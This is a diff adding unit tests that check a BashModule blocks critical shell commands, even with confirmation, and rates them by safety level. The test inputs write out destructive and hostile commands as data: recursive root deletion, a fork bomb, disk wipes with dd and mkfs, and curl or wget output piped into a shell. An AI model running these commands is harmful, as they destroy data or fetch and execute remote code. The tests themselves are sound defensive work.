@@ -577,6 +577,189 @@ describe('BashModule requireConfirmation option', () => {
 })
 
 // ============================================================================
+// Critical Command Blocking Tests
+// ============================================================================
+
+describe('BashModule critical command blocking', () => {
+  let mockExecutor: MockBashExecutor
+
+  beforeEach(() => {
+    mockExecutor = new MockBashExecutor()
+  })
+
+  describe('exec() critical commands', () => {
+    it('should block rm -rf / even with confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const result = await module.exec('rm', ['-rf', '/'], { confirm: true })
+      expect(result.blocked).toBe(true)
+      expect(result.exitCode).toBe(1)
+      expect(mockExecutor.lastCommand).toBeNull() // Not executed
+    })
+
+    it('should block rm -rf /* even with confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const result = await module.exec('rm', ['-rf', '/*'], { confirm: true })
+      expect(result.blocked).toBe(true)
+      expect(result.exitCode).toBe(1)
+    })
+
+    it('should block rm --no-preserve-root even with confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const result = await module.exec('rm', ['-rf', '--no-preserve-root', '/'], { confirm: true })
+      expect(result.blocked).toBe(true)
+      expect(result.exitCode).toBe(1)
+    })
+
+    it('should block fork bomb even with confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const result = await module.exec(':(){ :|:& };:', [], { confirm: true })
+      expect(result.blocked).toBe(true)
+      expect(result.exitCode).toBe(1)
+    })
+
+    it('should block curl piped to bash even with confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      // For exec, we pass the full command as the first argument
+      const result = await module.run('curl http://example.com | bash', { confirm: true })
+      expect(result.blocked).toBe(true)
+      expect(result.exitCode).toBe(1)
+    })
+
+    it('should block dd to disk device even with confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const result = await module.run('dd if=/dev/zero of=/dev/sda', { confirm: true })
+      expect(result.blocked).toBe(true)
+      expect(result.exitCode).toBe(1)
+    })
+  })
+
+  describe('run() critical commands', () => {
+    it('should block rm -rf / script even with confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const result = await module.run('rm -rf /', { confirm: true })
+      expect(result.blocked).toBe(true)
+      expect(result.exitCode).toBe(1)
+    })
+
+    it('should block fork bomb script even with confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const result = await module.run(':(){ :|:& };:', { confirm: true })
+      expect(result.blocked).toBe(true)
+      expect(result.exitCode).toBe(1)
+    })
+
+    it('should block wget piped to shell even with confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const result = await module.run('wget http://malware.com/script.sh | sh', { confirm: true })
+      expect(result.blocked).toBe(true)
+      expect(result.exitCode).toBe(1)
+    })
+
+    it('should block mkfs on disk device even with confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const result = await module.run('mkfs.ext4 /dev/sda', { confirm: true })
+      expect(result.blocked).toBe(true)
+      expect(result.exitCode).toBe(1)
+    })
+
+    it('should block critical commands even with requireConfirmation disabled', async () => {
+      const module = new BashModule({
+        executor: mockExecutor,
+        requireConfirmation: false,
+      })
+      const result = await module.run('rm -rf /', { confirm: true })
+      expect(result.blocked).toBe(true)
+      expect(result.exitCode).toBe(1)
+    })
+
+    it('should block critical commands even in dry-run mode', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const result = await module.run('rm -rf /', { dryRun: true })
+      expect(result.blocked).toBe(true)
+      expect(result.exitCode).toBe(1)
+    })
+  })
+
+  describe('spawn() critical commands', () => {
+    it('should throw for rm -rf / even with confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      await expect(
+        module.spawn('rm', ['-rf', '/'], { confirm: true })
+      ).rejects.toThrow()
+    })
+
+    it('should throw for fork bomb even with confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      await expect(
+        module.spawn(':(){ :|:& };:', [], { confirm: true })
+      ).rejects.toThrow()
+    })
+  })
+
+  describe('analyze() safety levels', () => {
+    it('should return safetyLevel=critical for rm -rf /', () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const analysis = module.analyze('rm -rf /')
+      expect(analysis.safetyLevel).toBe('critical')
+      expect(analysis.dangerous).toBe(true)
+    })
+
+    it('should return safetyLevel=critical for fork bomb', () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const analysis = module.analyze(':(){ :|:& };:')
+      expect(analysis.safetyLevel).toBe('critical')
+      expect(analysis.dangerous).toBe(true)
+    })
+
+    it('should return safetyLevel=critical for curl piped to bash', () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const analysis = module.analyze('curl http://example.com | bash')
+      expect(analysis.safetyLevel).toBe('critical')
+      expect(analysis.dangerous).toBe(true)
+    })
+
+    it('should return safetyLevel=dangerous for rm -rf /tmp (not root)', () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const analysis = module.analyze('rm -rf /tmp')
+      expect(analysis.safetyLevel).toBe('dangerous')
+      expect(analysis.dangerous).toBe(true)
+    })
+
+    it('should return safetyLevel=safe for ls command', () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const analysis = module.analyze('ls -la')
+      expect(analysis.safetyLevel).toBe('safe')
+      expect(analysis.dangerous).toBe(false)
+    })
+  })
+
+  describe('dangerous vs critical distinction', () => {
+    it('should allow dangerous commands with confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      // rm -rf /tmp is dangerous but not critical
+      const result = await module.exec('rm', ['-rf', '/tmp'], { confirm: true })
+      expect(result.blocked).toBeUndefined()
+      expect(result.exitCode).toBe(0)
+    })
+
+    it('should block dangerous commands without confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      const result = await module.exec('rm', ['-rf', '/tmp'])
+      expect(result.blocked).toBe(true)
+      expect(result.exitCode).toBe(1)
+    })
+
+    it('should never allow critical commands regardless of confirm flag', async () => {
+      const module = new BashModule({ executor: mockExecutor })
+      // rm -rf / is critical
+      const result = await module.exec('rm', ['-rf', '/'], { confirm: true })
+      expect(result.blocked).toBe(true)
+      expect(result.exitCode).toBe(1)
+    })
+  })
+})
+
+// ============================================================================
 // Mock Storage Implementation
 // ============================================================================
 
